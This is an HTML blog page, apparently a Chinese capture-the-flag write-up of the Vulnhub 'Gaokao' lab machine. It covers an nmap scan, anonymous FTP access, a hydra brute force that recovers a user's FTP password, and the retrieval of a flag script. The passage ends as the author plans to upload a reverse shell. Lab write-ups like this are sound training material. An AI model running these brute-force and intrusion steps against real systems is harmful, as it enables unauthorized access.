@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Vulnhub-Gaokao靶机复盘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub-Gaokao">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/58538.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="Vulnhub-Gaokao靶机复盘">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-02-09T09:32:06.000Z">
+<meta property="article:modified_time" content="2025-02-09T12:46:59.818Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="vulnhub">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/58538.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Vulnhub-Gaokao | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">44</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/58538.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Vulnhub-Gaokao
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-02-09 17:32:06 / 修改时间：20:46:59" itemprop="dateCreated datePublished" datetime="2025-02-09T17:32:06+08:00">2025-02-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67a87709d0e0a243d4fd5a67.png" class="img-topic">
+        </div>
+      
+      
+        <p>Vulnhub-Gaokao靶机复盘</p>
+<span id="more"></span>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.179.139    </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">09</span> <span class="number">18</span>:<span class="number">21</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.139</span> (<span class="number">192.168</span>.<span class="number">179.139</span>)</span><br><span class="line">Host is up (<span class="number">0.0021</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">996</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">21</span><span class="symbol">/tcp</span>   open  ftp     ProFTPD <span class="number">1.3</span>.<span class="number">5</span>e</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>   open  ssh     OpenSSH <span class="number">7.6</span>p1 Ubuntu <span class="number">4</span>ubuntu0.<span class="number">3</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">48</span>:<span class="number">39</span>:<span class="number">31</span>:<span class="number">22</span>:fb:c2:<span class="number">03</span>:<span class="number">44</span>:a7:<span class="number">4</span>e:c0:fa:b8:ad:<span class="number">2</span>f:<span class="number">96</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">70</span>:a7:<span class="number">74</span>:<span class="number">5</span>e:a3:<span class="number">79</span>:<span class="number">60</span>:<span class="number">28</span>:<span class="number">1</span>a:<span class="number">45</span>:<span class="number">4</span>c:ab:<span class="number">5</span>c:e7:<span class="number">87</span>:ad (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">9</span>c:<span class="number">35</span>:ce:f6:<span class="number">59</span>:<span class="number">66</span>:<span class="number">7</span>f:ae:c4:d1:<span class="number">21</span>:<span class="number">16</span>:d5:aa:<span class="number">56</span>:<span class="number">71</span> (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span>   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">29</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.29</span> (Ubuntu)</span><br><span class="line">|<span class="params">_http-title:</span> Wellcome to <span class="params">Funbox:</span> Gaokao <span class="operator">!</span></span><br><span class="line"><span class="number">3306</span><span class="symbol">/tcp</span> open  mysql   MySQL <span class="number">5.7</span>.<span class="number">3</span>4-<span class="number">0</span>ubuntu0.<span class="number">18.04</span>.<span class="number">1</span></span><br><span class="line">| <span class="params">mysql-info:</span> </span><br><span class="line">|   <span class="params">Protocol:</span> <span class="number">10</span></span><br><span class="line">|   <span class="params">Version:</span> <span class="number">5.7</span>.<span class="number">3</span>4-<span class="number">0</span>ubuntu0.<span class="number">18.04</span>.<span class="number">1</span></span><br><span class="line">|   Thread <span class="params">ID:</span> <span class="number">3</span></span><br><span class="line">|   Capabilities <span class="params">flags:</span> <span class="number">65535</span></span><br><span class="line">|   Some <span class="params">Capabilities:</span> LongPassword, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SwitchToSSLAfterHandshake, FoundRows, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, SupportsLoadDataLocal, Speaks41ProtocolNew, LongColumnFlag, Support41Auth, InteractiveClient, IgnoreSigpipes, SupportsTransactions, ODBCClient, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments</span><br><span class="line">|   <span class="params">Status:</span> Autocommit</span><br><span class="line">|   <span class="params">Salt:</span> k%\x0E5s72S\x1B<span class="operator">!</span><span class="operator">+</span>\x1F26p\x1C\x02I0T</span><br><span class="line">|_  Auth Plugin <span class="params">Name:</span> mysql_native_password</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">32</span>:<span class="number">5</span>F:D8:FC:<span class="number">12</span>:<span class="number">14</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OSs:</span> Unix, Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.11</span> ms <span class="number">192.168</span>.<span class="number">179.139</span> (<span class="number">192.168</span>.<span class="number">179.139</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">36.03</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>web端是一个默认的ubuntu界面，说明只是开放了http服务，但是没有内容.<br>ftp可以匿名登录,把这个welcome下载下来</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># ftp anonymous@192.168.179.139</span></span><br><span class="line">Connected <span class="built_in">to</span> <span class="number">192.168</span><span class="number">.179</span><span class="number">.139</span>.</span><br><span class="line"><span class="number">220</span> ProFTPD <span class="number">1.3</span><span class="number">.5</span>e Server (Debian) [::ffff:<span class="number">192.168</span><span class="number">.179</span><span class="number">.139</span>]</span><br><span class="line"><span class="number">331</span> Anonymous login ok, <span class="built_in">send</span> your complete email address <span class="keyword">as</span> your password</span><br><span class="line">Password: </span><br><span class="line"><span class="number">230</span>-Welcome, archive user anonymous@<span class="number">192.168</span><span class="number">.179</span><span class="number">.83</span> !</span><br><span class="line"><span class="number">230</span>-</span><br><span class="line"><span class="number">230</span>-The <span class="built_in">local</span> <span class="built_in">time</span> is: Sun Feb <span class="number">09</span> <span class="number">10</span>:<span class="number">23</span>:<span class="number">22</span> <span class="number">2025</span></span><br><span class="line"><span class="number">230</span>-</span><br><span class="line"><span class="number">230</span>-This is <span class="keyword">an</span> experimental FTP server.  If you have <span class="keyword">any</span> unusual problems,</span><br><span class="line"><span class="number">230</span>-please report them via e-mail <span class="built_in">to</span> &lt;sky@funbox9&gt;.</span><br><span class="line"><span class="number">230</span>-</span><br><span class="line"><span class="number">230</span> Anonymous access granted, restrictions apply</span><br><span class="line">Remote <span class="keyword">system</span> type is UNIX.</span><br><span class="line">Using binary mode <span class="built_in">to</span> transfer <span class="built_in">files</span>.</span><br><span class="line"><span class="keyword">ftp</span>&gt; ls</span><br><span class="line"><span class="number">229</span> Entering Extended Passive Mode (|||<span class="number">8782</span>|)</span><br><span class="line"><span class="number">150</span> Opening ASCII mode data connection <span class="keyword">for</span> <span class="built_in">file</span> list</span><br><span class="line">-rw-r<span class="comment">--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg</span></span><br><span class="line"><span class="number">226</span> Transfer complete</span><br><span class="line"><span class="keyword">ftp</span>&gt; <span class="built_in">get</span> welcome.msg</span><br><span class="line"><span class="built_in">local</span>: welcome.msg remote: welcome.msg</span><br><span class="line"><span class="number">229</span> Entering Extended Passive Mode (|||<span class="number">51553</span>|)</span><br><span class="line"><span class="number">150</span> Opening BINARY mode data connection <span class="keyword">for</span> welcome.msg (<span class="number">169</span> <span class="keyword">bytes</span>)</span><br><span class="line"><span class="number">100</span>% |********************************************************************|   <span class="number">169</span>       <span class="number">31.01</span> KiB/s    <span class="number">00</span>:<span class="number">00</span> ETA</span><br><span class="line"><span class="number">226</span> Transfer complete</span><br><span class="line"><span class="number">169</span> <span class="keyword">bytes</span> received <span class="keyword">in</span> <span class="number">00</span>:<span class="number">00</span> (<span class="number">14.47</span> KiB/s)</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cat welcome.msg                                  </span><br><span class="line">Welcome, archive <span class="keyword">user</span> %U@%R !</span><br><span class="line"></span><br><span class="line">The <span class="keyword">local</span> <span class="type">time</span> <span class="keyword">is</span>: %T</span><br><span class="line"></span><br><span class="line">This <span class="keyword">is</span> an experimental FTP <span class="keyword">server</span>.  <span class="keyword">If</span> you have <span class="keyword">any</span> unusual problems,</span><br><span class="line">please report them via e-mail <span class="keyword">to</span> &lt;sky@%L&gt;.</span><br></pre></td></tr></table></figure></div>
+<p>这出现了两个疑似用户的东西，尝试ftp登录看看</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ftp <span class="variable">%U</span>@<span class="variable">%R</span><span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span>    </span><br><span class="line"><span class="symbol">ftp:</span> Can&#x27;t lookup `<span class="variable">%R</span><span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span>:ftp&#x27;: Name <span class="keyword">or</span> service not known</span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ftp user<span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span> </span><br><span class="line">Connected <span class="keyword">to</span> <span class="number">192.168</span>.<span class="number">179.139</span>.</span><br><span class="line"><span class="number">220</span> ProFTPD <span class="number">1.3</span>.<span class="number">5</span>e Server (Debian) [::ffff:<span class="number">192.168</span>.<span class="number">179.139</span>]</span><br><span class="line"><span class="number">331</span> Password required for user</span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ftp sky@<span class="variable">%L</span><span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span></span><br><span class="line"><span class="symbol">ftp:</span> Can&#x27;t lookup `<span class="variable">%L</span><span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span>:ftp&#x27;: Name <span class="keyword">or</span> service not known</span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ftp sky<span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span>    </span><br><span class="line">Connected <span class="keyword">to</span> <span class="number">192.168</span>.<span class="number">179.139</span>.</span><br><span class="line"><span class="number">220</span> ProFTPD <span class="number">1.3</span>.<span class="number">5</span>e Server (Debian) [::ffff:<span class="number">192.168</span>.<span class="number">179.139</span>]</span><br><span class="line"><span class="number">331</span> Password required for sky</span><br><span class="line">Password: </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>尝试一下，发现可能有user 和 sky用户，用hydra爆破一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# hydra -l sky -P /usr/<span class="keyword">share</span>/wordlists/rockyou.txt ftp://<span class="number">192.168</span><span class="number">.179</span><span class="number">.139</span> </span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-02</span><span class="number">-09</span> <span class="number">18</span>:<span class="number">40</span>:<span class="number">46</span></span><br><span class="line">[DATA] max <span class="number">16</span> tasks per <span class="number">1</span> <span class="keyword">server</span>, overall <span class="number">16</span> tasks, <span class="number">14344399</span> <span class="keyword">login</span> tries (l:<span class="number">1</span>/p:<span class="number">14344399</span>), ~<span class="number">896525</span> tries per task</span><br><span class="line">[DATA] attacking ftp://<span class="number">192.168</span><span class="number">.179</span><span class="number">.139</span>:<span class="number">21</span>/</span><br><span class="line">[STATUS] <span class="number">295.00</span> tries/min, <span class="number">295</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">14344106</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">810</span>:<span class="number">25</span>h, <span class="number">14</span> active</span><br><span class="line">[<span class="number">21</span>][ftp] host: <span class="number">192.168</span><span class="number">.179</span><span class="number">.139</span>   <span class="keyword">login</span>: sky   <span class="keyword">password</span>: thebest</span><br><span class="line"><span class="number">1</span> <span class="keyword">of</span> <span class="number">1</span> target successfully completed, <span class="number">1</span> <span class="keyword">valid</span> <span class="keyword">password</span> <span class="built_in">found</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Writing restore file because <span class="number">2</span> final worker threads did <span class="keyword">not</span> complete <span class="keyword">until</span> <span class="keyword">end</span>.</span><br><span class="line">[ERROR] <span class="number">2</span> targets did <span class="keyword">not</span> resolve <span class="keyword">or</span> could <span class="keyword">not</span> be connected</span><br><span class="line">[ERROR] <span class="number">0</span> target did <span class="keyword">not</span> complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-02</span><span class="number">-09</span> <span class="number">18</span>:<span class="number">43</span>:<span class="number">31</span></span><br></pre></td></tr></table></figure></div>
+<p>成功得到sky用户的密码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">drwxr-xr-x  <span class="number"> 3 </span>sky      sky         <span class="number"> 4096 </span>Jun <span class="number"> 6 </span><span class="number"> 2021 </span>.</span><br><span class="line">drwxr-xr-x  <span class="number"> 5 </span>root     root        <span class="number"> 4096 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>..</span><br><span class="line">-rw-------  <span class="number"> 1 </span>sky      sky           <span class="number"> 56 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bash_history</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky          <span class="number"> 220 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bash_logout</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky         <span class="number"> 3771 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bashrc</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky          <span class="number"> 807 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.profile</span><br><span class="line">drwxr-----  <span class="number"> 2 </span>root     root        <span class="number"> 4096 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.ssh</span><br><span class="line">-rwxr-x---  <span class="number"> 1 </span>sky      sarah         <span class="number"> 66 </span>Jun <span class="number"> 6 </span><span class="number"> 2021 </span>user.flag</span><br><span class="line">-rw-------  <span class="number"> 1 </span>sky      sky         <span class="number"> 1489 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.viminfo</span><br><span class="line">226 Transfer complete</span><br><span class="line">ftp&gt; cat user.flag</span><br><span class="line">?Invalid command.</span><br><span class="line">ftp&gt; get user.flag</span><br><span class="line">local: user.flag remote: user.flag</span><br><span class="line">229 Entering Extended Passive Mode (|||8837|)</span><br><span class="line">150 Opening BINARY mode data connection for user.flag (66 bytes)</span><br><span class="line">100% |********************************************************************|   <span class="number"> 66 </span>       1.67 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete</span><br></pre></td></tr></table></figure></div>
+<p>有个userflag，而且这个sarah是组成员，看看user flag</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="D"><figure class="iseeu highlight /d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cat user.flag                                    </span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">echo <span class="string">&quot;Your flag is:88jjggzzZhjJjkOIiu76TggHjoOIZTDsDSd&quot;</span></span><br></pre></td></tr></table></figure></div>
+<p>这个flag不是base64，但是这个user.flag不是一个简单的文本，它是一个sh脚本<br>所以肯定要用这个文件,我现在接触的sh脚本自己用的只有用来反弹shell,那我们就在ftp中上传反弹shell脚本</p>
